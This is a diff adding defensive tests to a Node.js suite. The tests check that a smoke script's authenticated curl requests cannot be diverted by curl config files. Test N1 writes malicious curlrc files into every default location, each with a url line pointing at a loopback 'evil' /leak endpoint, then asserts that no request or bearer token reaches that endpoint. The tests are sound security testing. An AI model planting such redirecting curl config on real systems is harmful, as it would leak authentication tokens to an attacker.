@@ -648,6 +648,34 @@ test('M2 smoke destination: the genuine tagged origin of the canonical bridge se
 test('M3 smoke destination: a redirect answer on the authenticated request fails the smoke and writes no evidence', { skip: !haveTools || !have('curl') }, () => {
   for (const code of ['301', '302', '307', '308']) { const s = smokeReady(); fs.writeFileSync(path.join(s.w.d, 'auth-code'), code); const r = s.smoke(); assert.notStrictEqual(r.status, 0, code); assert.ok(!fs.existsSync(s.evid), code); }
 });
+
+// ======== curl default configuration must never add a destination (Codex P1 on 669db903): REAL curl, loopback HTTPS stand-ins, malicious curlrc files in an isolated HOME ========
+const CANON_HOST = `a0-dfd49116---${BRIDGE_HOST}`;
+async function startHttps(role, dir, log) { const { spawn } = require('node:child_process'); const child = spawn(process.execPath, [path.join(__dirname, 'fixtures', 'release08', 'https-fixture-server.js'), role, dir, log], { stdio: ['ignore', 'pipe', 'inherit'] }); const port = await new Promise((resolve, reject) => { child.stdout.once('data', (d) => resolve(Number(String(d).match(/PORT (\d+)/)[1]))); child.once('error', reject); setTimeout(() => reject(new Error('fixture server did not start')), 10000); }); return { child, port }; }
+function makeCert(dir) { execFileSync('openssl', ['req', '-x509', '-newkey', 'rsa:2048', '-nodes', '-keyout', path.join(dir, 'key.pem'), '-out', path.join(dir, 'cert.pem'), '-days', '1', '-subj', '/CN=fixture', '-addext', `subjectAltName=DNS:${CANON_HOST},IP:127.0.0.1`], { stdio: 'ignore' }); }
+const curlReal = have('curl') && have('openssl');
+test('N1 curl default configuration (.curlrc in every default location) can never add a destination or deliver the bearer token elsewhere; genuine smoke still passes', { skip: !haveTools || !curlReal, timeout: 120000 }, async () => {
+  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'bg-curl-')); makeCert(dir); const canonLog = path.join(dir, 'canon.log'), evilLog = path.join(dir, 'evil.log'); fs.writeFileSync(canonLog, ''); fs.writeFileSync(evilLog, '');
+  const canon = await startHttps('canonical', dir, canonLog), evil = await startHttps('evil', dir, evilLog);
+  try {
+    const locations = { HOME_dot_curlrc: (home) => ({ file: path.join(home, '.curlrc'), env: {} }), HOME_config_curlrc: (home) => ({ file: path.join(home, '.config', 'curlrc'), env: {} }), CURL_HOME: (home) => ({ file: path.join(home, 'curlhome', '.curlrc'), env: { CURL_HOME: path.join(home, 'curlhome') } }), XDG_CONFIG_HOME: (home) => ({ file: path.join(home, 'xdg', 'curlrc'), env: { XDG_CONFIG_HOME: path.join(home, 'xdg') } }) };
+    for (const [name, loc] of Object.entries(locations)) {
+      fs.writeFileSync(canonLog, ''); fs.writeFileSync(evilLog, '');
+      const s = smokeReady(); const wrapper = `#!/bin/sh\nfirst="$1"; shift\nexec /usr/bin/curl "$first" --connect-to ${CANON_HOST}:443:127.0.0.1:${canon.port} --cacert ${path.join(dir, 'cert.pem')} "$@"\n`; fs.writeFileSync(path.join(s.w.home, 'bin', 'curl'), wrapper); fs.chmodSync(path.join(s.w.home, 'bin', 'curl'), 0o755);
+      const l = loc(s.w.home); fs.mkdirSync(path.dirname(l.file), { recursive: true }); fs.writeFileSync(l.file, `url = "https://127.0.0.1:${evil.port}/leak"\n`);
+      const r = s.w.run('a0-smoke.sh', [], { EXPECT_PROJECT_H: sha8(SMOKE_PROJ), ...l.env }, 'TOKEN-SENTINEL-xyz\n');
+      const evilLines = fs.readFileSync(evilLog, 'utf8').split('\n').filter(Boolean).map((x) => JSON.parse(x)); const canonLines = fs.readFileSync(canonLog, 'utf8').split('\n').filter(Boolean).map((x) => JSON.parse(x));
+      assert.strictEqual(evilLines.length, 0, `${name}: the unrelated destination received ${evilLines.length} request(s), ${evilLines.filter((x) => x.auth).length} with an Authorization header`);
+      assert.ok(!evilLines.some((x) => x.auth), name); assert.strictEqual(r.status, 0, `${name}: ${out(r)}`); assert.ok(fs.existsSync(s.evid), name + ': legitimate smoke must still pass');
+      assert.strictEqual(canonLines.filter((x) => x.auth).length, 1, name + ': exactly one authenticated request, to the canonical bridge only'); assert.ok(canonLines.length >= 7, name); assert.ok(canonLines.every((x) => x.role === 'canonical'));
+      assert.ok(!(r.stdout + r.stderr).includes('TOKEN-SENTINEL'), name + ': token in output'); assert.ok(!fs.readFileSync(canonLog, 'utf8').includes('TOKEN-SENTINEL'), name);
+    }
+  } finally { canon.child.kill(); evil.child.kill(); fs.rmSync(dir, { recursive: true, force: true }); }
+});
+test('N2 every curl invocation in the smoke script has -q as its FIRST argument (static)', () => {
+  const src = fs.readFileSync(path.join(S, 'a0-smoke.sh'), 'utf8'); const calls = src.match(/\bcurl\s+[^\n]*/g).filter((l) => !/^curl\s+(\$|"|=)/.test(l) && !/command -v/.test(l)); const invocations = src.split('\n').filter((l) => /(^|[|$({\s])curl -/.test(l) && !/command -v/.test(l));
+  assert.ok(invocations.length >= 2); for (const l of invocations) assert.match(l, /curl -q /, l); assert.ok(calls.length >= 2);
+});
 const py = have('python3') && spawnSync('python3', ['-c', 'import yaml']).status === 0;
 test('scanner patch tool: allowlist, no --remove, approved settings accepted', { skip: !py }, () => {
   const base = ['--api-image', `${REPO}/bizgenie-api@sha256:${'a'.repeat(64)}`, '--clamav-image', `${REPO}/clamav@sha256:${'b'.repeat(64)}`, '--suffix', 'a2s1', '--tag', 'a2-scanner'];
